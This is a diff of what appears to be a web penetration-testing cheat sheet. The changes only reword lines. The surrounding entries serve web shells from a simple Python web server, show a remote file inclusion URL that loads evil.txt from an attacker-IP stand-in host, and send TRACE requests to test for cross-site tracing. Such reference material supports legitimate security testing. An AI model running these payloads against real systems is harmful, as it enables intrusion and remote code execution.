@@ -32,7 +32,7 @@ POST Passes all requested data in the HTTP request body.
 
 # Simple web server to share malicious code
 
-Change directory to where your scripts/web shells are located.
+Change directory to where your scripts and web shells are located.
 cd /root/scripts/
 python -m SimpleHTTPServer 80
 ------------------------------------------------------------------------------------------------------
@@ -122,7 +122,7 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://localhost/index.php?page=http://attackerIP/evil.txt
+http://target IP/index.php?page=http://attackerIP/evil.txt
 ------------------------------------------------------------------------------------------------------
 
 # TRACE / TRACK methods allowed
@@ -132,7 +132,7 @@ OPTIONS / HTTP/1.0
 (hit enter 2x)
 
 Check for cross-site tracing (XST)
-curl -X TRACE <target>
+curl -X TRACE <target IP>
 curl -X TRACE -H "Cookie: name=value" <target>
 ------------------------------------------------------------------------------------------------------
 
